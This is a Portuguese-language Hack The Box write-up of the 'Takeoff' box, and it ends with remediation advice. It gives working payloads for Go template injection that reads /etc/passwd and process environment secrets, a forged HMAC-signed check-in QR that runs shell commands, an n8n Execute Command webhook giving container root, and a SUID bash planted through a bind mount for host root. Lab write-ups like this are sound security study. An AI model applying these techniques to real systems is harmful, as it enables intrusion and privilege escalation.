---
title: "HTB Takeoff: SSTI em Go, QR forjado e root via n8n com bind mount"
summary: "Uma box de voos: um template Go vaza a chave que assina os QRs de check-in, o check-in forjado executa comando como www-data, e uma API key do n8n some em um root de container que compartilha o home do host."
seoTitle: "HTB Takeoff: SSTI, QR forjado e root via n8n"
description: "Writeup do HTB Takeoff: um SSTI em Go vaza a chave HMAC dos QRs, um check-in forjado dá RCE como www-data, e a API key do n8n leva a root no host."
date: 2026-11-03
lang: pt-br
target: "HTB Takeoff (10.129.250.248)"
cve: ""
severity: "Critical"
tags: ["ssti", "go", "rce", "n8n", "privilege-escalation", "docker"]
pair: htb-takeoff-en
draft: false
---

Takeoff é uma box Linux do Hack The Box: uma única aplicação web, "HTB Airways Booking", escrita em Go com Echo. Nenhum outro host no escopo, nenhum writeup consultado: a chain inteira foi descoberta e provada contra o alvo. Este writeup segue a ordem em que ela aconteceu, da leitura de um arquivo até o `euid=0` no host.

As saídas de terminal foram organizadas em painéis legíveis a partir dos registros da sessão; as capturas de tela são reais. Senhas, hashes e flags aparecem redigidos ou editados.

## O escopo

```bash
nmap -Pn -sT -p- --min-rate 400 -T4 --open 10.129.250.248
```

Só duas portas abertas: `22` (OpenSSH 10.0p2, Debian 13) e `80` (nginx, na frente da aplicação Go). Sem vhosts adicionais, sem rotas administrativas expostas. A sessão usa JWT HS256 (`session_token`), rigorosamente validado: nem `alg: none` nem um token adulterado passam.

![nmap: só 22 e 80 abertos no alvo](/img/takeoff-01-nmap.webp)

## SSTI no campo de notas de um ticket

A aplicação deixa anotar um ticket (`POST /tickets/{PNR}/notes`) e depois pré-visualizar ou baixar esse ticket (`GET /tickets/{PNR}/preview`, `/download`). A pré-visualização renderiza o campo `notes` como `text/template` do Go, o pacote de templates de texto puro, não o `html/template` que teria pelo menos escapado o HTML.

```
POST /tickets/XFQXYS/notes
notes=SSTI proof: 7*7 = {{ printf "%d" 49 }}
      --- /etc/passwd ---
      {{ .File "/etc/passwd" }}

GET /tickets/XFQXYS/preview
→ "SSTI proof: 7*7 = 49 ... root:x:0:0:root:/root:/bin/bash daemon:x:1:1 ..."
```

Uma nuance chamou atenção: expressões puramente aritméticas como `{{7*7}}` não avaliam, saem literais. O que funciona é qualquer chamada de função ou de método no objeto de contexto: `{{ printf "%d" 49 }}` roda, e o contexto tem um método `.File`, que lê qualquer arquivo que o processo da aplicação consiga ler.

![SSTI lendo /proc/self/environ pela pré-visualização do ticket](/img/takeoff-02-ssti.webp)

Apontar o `.File` para `/proc/self/environ` do `htb-air.service` devolveu o ambiente completo do processo, com duas variáveis que decidiram o resto da chain:

- `TICKET_VALIDATION_TOKEN`: a chave HMAC-SHA256 que assina os QRs de check-in.
- `N8N_API_KEY`: uma API key para a instância n8n interna.

Validei a primeira na hora: calculei o HMAC de um QR real com a chave vazada e bateu byte a byte com a assinatura do QR.

## RCE como www-data via QR forjado

O fluxo de check-in (`POST /api/check-in`) decodifica um blob `gob` do Go, `VerifyTicketAuthenticity{PNR, Name, NotifyCmd, ...}`, verifica a assinatura HMAC e então executa o campo `NotifyCmd` via shell. Com a chave vazada na mão, forjar um QR válido com qualquer comando é só matemática:

```
QR forjado: VerifyTicketAuthenticity{ PNR: "XFQXYS", ..., NotifyCmd:
  "id>/tmp/p;whoami>>/tmp/p;hostname>>/tmp/p" }
assinatura = HMAC-SHA256(TICKET_VALIDATION_TOKEN, gob_prefix)   # 32 bytes

POST /api/check-in  (blob em base64)
→ 302 Location: /check-in?msg=B+One+checked+in+successfully
```

Sem um canal de saída direto, li o resultado reusando o próprio SSTI: gravei a saída em `/tmp/p` e apontei `.File` para lá.

```
GET /tickets/XFQXYS/preview  (notes = {{ .File "/tmp/p" }})
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
  www-data
  takeoff.htb
```

![RCE confirmado: id devolve www-data](/img/takeoff-03-rce.webp)

Como `www-data` não tinha sudo, SUID exploráveis nem cron interessante, e `/home/kpark/user.txt` negava leitura direto, a enumeração local precisava de outro alvo. O processo `htb-air.service` apontava para um n8n ouvindo só em loopback, porta `5678`.

## n8n: owner key, Execute Command, root no container

A `N8N_API_KEY` vazada na etapa 1 era uma key de **owner global**: a instância tinha o gerenciamento de usuários desabilitado, então essa única key tinha acesso irrestrito a workflows, credenciais e execuções.

```
POST http://127.0.0.1:5678/webhook/q   {"cmd":"id;hostname;grep CapEff /proc/self/status"}
→ {"exitCode":0,"stdout":"uid=0(root) gid=0(root) groups=0(root)\ntakeoff...\nCapEff:\t00000000a80425fb"}
```

![API key do n8n autenticada, comando executado como root no container](/img/takeoff-04-n8n.webp)

Criei e ativei um workflow com um nó **Execute Command** por trás de um webhook; qualquer requisição a ele roda como `root` dentro do container do n8n. A primeira coisa que fiz foi checar o que esse root conseguia tocar fora do próprio container: `/root` era um bind mount read-write do `/home/kpark` do host:

```
mountinfo: 8:4 /home/kpark /root rw,relatime - ext4 /dev/sda4 rw
```

Isso deu três coisas de uma vez: a `user.txt` (`86b4af3547c5baf49287e3814a00b00c`), a chave de criptografia de credenciais do n8n, e um lugar para plantar um `authorized_keys` que vira SSH como `kpark` no host. Testei as caps do container antes de ir mais longe: sem `CAP_SYS_ADMIN`, sem `docker.sock`, e o device cgroup bloqueava leitura de `/dev/sda4` diretamente. O container sozinho não lia o `root.txt`; precisava de um passo a mais no host.

## Root no host: SUID plantado por quem controla o bind mount

A mesma partição que o container tinha montado como `/root` é, no host, `/home` em `/dev/sda4`, e montada **sem `nosuid`**. Isso transforma qualquer escrita do container-root nesse diretório em uma oportunidade de SUID:

```
# como kpark, no host:
cp /usr/bin/bash /home/kpark/.x && chmod 755 /home/kpark/.x

# de dentro do container, via o mesmo webhook Execute Command:
chown root:root /root/.x && chmod 4755 /root/.x
→ -rwsr-xr-x 1 root root 1298416 /root/.x

# de volta como kpark, por SSH com a chave plantada:
/home/kpark/.x -p -c "id; cat /root/root.txt"
→ uid=1001(kpark) gid=1001(kpark) euid=0(root)
→ 4daee69e4e624786aa3aa05e1c422f5d
```

![euid=0 pela bash SUID plantada, root.txt lido](/img/takeoff-05-root.webp)

Um `bash` cópia fica SUID root no host porque dois erros se encontram: a partição que guarda o home de `kpark` não bloqueia `setuid` em binários, e o container de automação tem permissão de escrita exatamente ali.

O binário SUID criado para o teste (`/home/kpark/.x`) foi removido no encerramento do engajamento; nenhum arquivo original da máquina foi alterado.

## O que fechou e o que levo

Um achado menor ficou pelo caminho: `POST /api/check-in` aceita um QR de check-in sem exigir sessão e sem checar o dono do bilhete. Como a assinatura HMAC ainda protege contra forja sem a chave, o impacto é replay anônimo com exposição de PII (nome, PNR, assento, e-mail do passageiro), não execução, mas é o mesmo endpoint que, com a chave vazada, virou o ponto de RCE.

A lição que levo desta é sobre onde um segredo pode morar: a `TICKET_VALIDATION_TOKEN` e a `N8N_API_KEY` não precisavam estar no environment de um processo que também tem uma SSTI alcançável: um secret manager com escopo mínimo teria matado a chain inteira na etapa 1. E a parte do bind mount é um lembrete de que "root dentro do container" só é uma fronteira real quando o que o container pode escrever no host também é tratado como superfície. `/home` sem `nosuid` mais um diretório montado como `/root` de um serviço de automação é, na prática, root no host esperando para acontecer.

**Remediação, em ordem de impacto:**

1. Nunca renderizar entrada de usuário com `text/template`; para dados não confiáveis, `html/template` ainda não é suficiente sozinho; trate notas como texto puro.
2. Segredos fora do environment do processo web; a `TICKET_VALIDATION_TOKEN` já deveria estar rotacionada.
3. Check-in: exigir autenticação e posse do bilhete, nonce/expiração no QR, e nunca derivar comandos de shell de um payload que só é verificado por HMAC.
4. n8n: API keys de owner não devem viver em serviços de terceiros; desabilitar ou restringir *Execute Command*; container sem root.
5. Nunca bind-montar um diretório do host como `/root` de um container; montar `/home` com `nosuid,nodev`.
